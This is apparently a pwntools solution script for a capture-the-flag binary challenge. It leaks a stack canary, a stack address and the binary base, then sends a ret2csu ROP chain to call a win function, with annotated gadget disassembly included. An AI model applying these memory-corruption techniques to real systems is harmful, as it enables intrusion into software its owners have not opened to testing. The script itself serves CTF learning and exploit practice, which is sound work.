#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.tubes

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

p = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
print(p.recvuntil(b'== proof-of-work: '))
if p.recvline().startswith(b'enabled'):
    handle_pow(p)

from pwn import *
import time

context.arch = "amd64"
context.encoding = "utf-8"

#p = process("./chall")
e = ELF("/home/user/chall")

# Leak stack cookie
p.sendline("y")
COOKIE_OFF = 10

time.sleep(1) # stuff die if removed

p.send(b"A"*(COOKIE_OFF+1))
p.recvuntil(b"You said: " + b"A"*(COOKIE_OFF+1))
COOKIE = b'\x00' + p.recv(7)
log.info(f"Stack cookie: {COOKIE}")
p.send(b"A"*COOKIE_OFF + COOKIE)
p.recvuntil(b"survey?\n")

# Re-run getFeedback to leak stack addr
p.sendline("y")
STACK_OFF = 18
p.send(b"A"*STACK_OFF)
p.recvuntil(b"You said: " + b"A"*STACK_OFF)
BUF = u64(p.recv(6) + b'\0\0') - (0x90 - 0x6e)
log.info(f"buffer: {hex(BUF)}")
p.send(b"A"*COOKIE_OFF + COOKIE)
p.recvuntil(b"survey?\n")

# Re-run getFeedback to leak binary base
p.sendline("y")
ADDR_OFF = 26
p.send(b"A"*ADDR_OFF)
p.recvuntil(b"You said: " + b"A"*ADDR_OFF)
MAIN = u64(p.recv(6) + b'\0\0') - 55
log.info(f"main: {hex(MAIN)}")
BIN_BASE = MAIN - 0x1410
log.info(f"base addr: {hex(BIN_BASE)}")
assert BIN_BASE & 0xfff == 0

# Perform ret2csu
# Target: rdi=102, rsi=108, rdx=97
WIN = BIN_BASE + 0x1249
pay = b'\0\0' + p64(WIN) + b"A"*(COOKIE_OFF - 10) + COOKIE
pay += p64(0)   # padding
pay += p64(BIN_BASE + 0x14ca)   # __libc_csu_init gadget 1
pay += p64(0)   # rbx
pay += p64(0)   # rbp
pay += p64(102) # r12
pay += p64(108) # r13
pay += p64(97)  # r14
pay += p64(BUF + 2) # r15
pay += p64(BIN_BASE + 0x14b0)   # __libc_csu_init gadget 2
p.send(pay)

p.recvuntil(b"idek{")
"""
                        LAB_001014b0
001014b0 4c 89 f2        MOV        RDX,R14
001014b3 4c 89 ee        MOV        RSI,R13
001014b6 44 89 e7        MOV        EDI,R12D
001014b9 41 ff 14 df     CALL       qword ptr [R15]
001014bd 48 83 c3 01     ADD        RBX,0x1
001014c1 48 39 dd        CMP        RBP,RBX
001014c4 75 ea           JNZ        LAB_001014b0
                        LAB_001014c6
001014c6 48 83 c4 08     ADD        RSP,0x8
001014ca 5b              POP        RBX     <-- 0
001014cb 5d              POP        RBP     <-- doesn't matter
001014cc 41 5c           POP        R12     <-- 102
001014ce 41 5d           POP        R13     <-- 108
001014d0 41 5e           POP        R14     <-- 97
001014d2 41 5f           POP        R15     <-- BUF_ADDR
001014d4 c3              RET
"""
exit(0)